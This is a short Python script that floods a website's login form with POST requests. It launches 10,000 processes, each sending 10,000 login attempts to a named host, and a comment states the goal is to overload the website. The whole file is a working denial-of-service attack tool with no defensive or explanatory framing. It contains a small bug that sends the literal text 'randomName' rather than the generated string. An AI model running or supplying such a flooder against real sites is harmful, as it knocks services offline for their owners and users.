import requests
import random
import string
from multiprocessing import Process
from time import sleep

url = 'http://apache1.willilazarov.cz/'
Pros = []

#generate random string
def get_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

#loop in which program tries to login to overload the website
def attack(i):
    for x in range(10000):
         #random string is inserted to login fields
        randomName = get_random_string(8)
        payload = {'username': 'randomName',
               'password': 'randomName',
               'login': 'login'
               }
        # instance to make a post request to the login url with  login details as a payload
        r = requests.Session()
        r.post(url, data=payload)
        print(x, 'toto je i: ', i)


if __name__ == "__main__":
    for i in range(0, 10000):
        print("Thread Started")
        p = Process(target=attack, args=(i,))
        Pros.append(p)
        p.start()

    # block until all the threads finish (i.e. block until all function_x calls finish)
    for t in Pros:
        t.join()

    print('finished')